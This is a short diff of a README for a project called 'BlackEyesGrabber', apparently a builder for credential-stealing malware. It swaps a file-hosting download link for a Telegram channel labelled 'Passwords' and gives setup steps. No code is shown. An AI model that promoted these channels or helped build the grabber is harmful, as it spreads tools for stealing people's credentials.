@@ -1,6 +1,6 @@
 # BlackEyesGrabber
 BlackEyes Buillder
 
-https://gofile.io/d/x28DTb
+Passwords: T.me/DataEyes
 
 Install Rust and Visual Studio Code
